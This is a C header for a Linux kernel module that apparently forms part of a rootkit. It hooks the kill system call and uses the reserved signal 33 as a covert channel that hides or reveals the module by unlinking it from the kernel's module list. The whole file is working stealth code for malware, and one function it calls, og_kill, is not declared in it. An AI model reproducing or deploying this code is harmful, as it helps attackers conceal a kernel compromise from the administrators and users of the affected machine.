#ifndef KILL_H
#define KILL_H

#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/spinlock.h>

/*
 * Control channel: kill -33 <pid> toggles module visibility.
 * Signal 33 is reserved by glibc on x86_64, so no legitimate
 * program sends it. Everything else passes to the real kill.
 */

static struct list_head *prev_module;
static int hidden = 0;
static DEFINE_SPINLOCK(toggle_lock);

static void hideme(void)
{
    mutex_lock(&module_mutex);
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    mutex_unlock(&module_mutex);
    hidden = 1;
}

static void showme(void)
{
    mutex_lock(&module_mutex);
    list_add(&THIS_MODULE->list, prev_module);
    mutex_unlock(&module_mutex);
    hidden = 0;
}

static asmlinkage long hooked_kill(pid_t pid, int sig)
{
    if (sig == 33) {
        /* mutex is a sleeping lock: take it directly — it serializes
         * concurrent toggles AND protects the list mutation */
        if (hidden) {
            mutex_lock(&module_mutex);
            if (hidden) {            /* re-check under lock */
                list_add(&THIS_MODULE->list, prev_module);
                hidden = 0;
            }
            mutex_unlock(&module_mutex);
        } else {
            mutex_lock(&module_mutex);
            if (!hidden) {
                prev_module = THIS_MODULE->list.prev;
                list_del(&THIS_MODULE->list);
                hidden = 1;
            }
            mutex_unlock(&module_mutex);
        }
        return 0;
    }
    return og_kill(pid, sig);
}

#endif